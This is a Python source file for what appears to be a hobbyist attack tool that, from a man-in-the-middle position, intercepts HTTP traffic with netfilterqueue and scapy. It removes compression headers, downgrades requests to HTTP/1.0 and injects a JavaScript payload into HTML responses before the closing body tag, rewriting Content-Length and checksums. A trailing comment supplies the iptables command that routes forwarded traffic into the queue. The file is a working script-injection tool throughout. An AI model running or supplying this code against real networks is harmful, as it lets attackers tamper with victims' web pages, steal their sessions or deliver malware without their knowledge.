#!/usr/bin/env python

"""
Author: Matthew Zito (goldmund) 
Contact: https://www.github.com/MatthewZito
Version: 0.1.0

Presumes controller is MITM.
Allocates HTTP Txs into a queue. Isolates HTTP raw load layer,
matches encoding against a regex and supplants with an empty str
to elicit plaintext HTML response, which enables JS injection.
"""
import re
import subprocess
import netfilterqueue
import scapy.all as scapy
from scapy.layers.inet import IP, TCP
from utils.instantiate_queue import instantiate_queue

ENCODING_REGEX = "Accept-Encoding:.*?\\r\\n"
LEN_REGEX = "(?:Content-Length:\s)(\d*)"
INJECTION_REGEX = "</body>"

class Injector:
    def __init__(self, payload):
        self.payload = payload
        instantiate_queue()
        self.bind_queue()

    def generate_load(self, packet, load):
        """
        Surrogates target file with controller-provided file.
        Configures necessary fields to generate valid packet response,
        returns said modified response.
        """
        packet[scapy.Raw].load = load
        del packet[IP].len
        del packet[IP].chksum
        del packet[TCP].chksum
        return packet

    def process_packet(self, packet): 
        """
        Determines how to process each packet in queue.
        Modifies HTTP Raw/Load layers req/res objects and injects
        JavaScript payload into HTML content, as matched against
        the injection regex.
        ...
        """
        # wrap payload packet in Scapy IP layer
        scapy_packet_obj = IP(packet.get_payload())
        if (scapy_packet_obj.haslayer(scapy.Raw)):
            load = scapy_packet_obj[scapy.Raw].load.decode()
            # request obj
            if (scapy_packet_obj[TCP].dport == 10000):
                print("[+] Request")
                # remove Encoding header to force resolution of HTML to UTF-8
                load = re.sub(ENCODING_REGEX, "", load)
                # downgrade to 1.0 to avoid chunks proc exception
                load = load.replace("HTTP/1.1" , "HTTP/1.0")
            # response obj
            elif (scapy_packet_obj[TCP].sport == 10000): 
                print("[+] Response")
                content_len_grp = re.search(LEN_REGEX, load)
                load = load.replace(INJECTION_REGEX, self.payload + INJECTION_REGEX)
            
                if (content_len_grp and "text/html" in load):
                    content_len = content_len_grp.group(1)
                    new_content_len = int(content_len) + len(self.payload)
                    load = load.replace(content_len, str(new_content_len))
            load = load.encode()
            # did we tamper with it?
            if (load != scapy_packet_obj[scapy.Raw].load):
                generated_packet = self.generate_load(scapy_packet_obj, load)
                packet.set_payload(str(generated_packet))

        packet.accept()

    def bind_queue(self):
        """
        Initiates a netfilterqueue object and binds to callback method
        so as to access the queue and act upon all packets therein.
        """
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, self.process_packet)
        queue.run()

"""
test locally: fwd_cmd = "iptables -I FORWARD -j NFQUEUE --queue-num 0" # change to port 80
then:
proc = subprocess.Popen(fwd_cmd, shell=True, stdout=subprocess.PIPE)
print(proc.communicate()[0]),
in lieu of https downgrade
"""